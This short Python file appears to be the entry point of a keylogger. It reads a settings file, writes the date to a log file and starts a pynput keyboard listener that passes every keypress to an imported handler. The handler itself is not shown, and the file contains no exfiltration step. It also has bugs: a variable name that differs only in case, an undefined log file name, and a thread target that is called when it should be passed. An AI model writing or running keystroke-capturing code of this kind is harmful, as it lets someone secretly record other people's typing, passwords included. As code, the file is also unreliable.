import threading
import time
import json
from pynput.keyboard import Listener
from src.functions.listener import *
from datetime import date

dataToday = date.today()  # gets date

is_online_Kl = False

def join():
    with open("settings.json", "r") as f:
        parameters = json.loads(f.read())
        kl_bool = parameters["offlinekl"]
        if kl_bool:
            is_online_kl = True

    if not is_online_kl:
        with open(fileName, "a") as f:
            f.write(str(dataToday) + "\n")
            f.close()

        with Listener(on_press=on_press) as ls:
            while True:
                ls.join()


if __name__ == "__main__":
    try:
        threading.Thread(target=join()).start()
    except Exception as e:
        print(e)
